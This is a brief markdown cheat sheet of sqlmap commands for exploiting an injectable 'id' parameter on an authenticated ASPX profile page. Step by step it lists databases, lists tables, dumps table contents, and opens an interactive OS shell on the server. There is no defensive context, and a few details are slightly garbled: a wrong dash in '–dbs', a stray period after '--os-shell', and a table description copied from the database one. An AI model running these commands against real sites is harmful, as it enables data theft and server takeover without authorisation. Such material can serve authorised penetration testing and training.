### List all databases

`id` param is injectable. Example below required auto cookie to access vulnerable page.
```
sqlmap -u "http://website/viewprofile.aspx?id=1" --cookie="[auth_cookie_value]" –dbs
```

### see one of these database

`db_name` is the database schema we want to explore tables
```
sqlmap -u "http://website/viewprofile.aspx?id=1" --cookie="[auth_cookie_value]" -D [db_name] --tables
```
### dump table's content
`table_name` is the database schema we want to explore tables
```
sqlmap -u "http://website/viewprofile.aspx?id=1" --cookie="[auth_cookie_value]" -D [db_name] -T [table_name] --dump
```
### get an os interactive shell
```
sqlmap -u "http://website/viewprofile.aspx?id=1" --cookie="[auth_cookie_value]"  --os-shell.
```
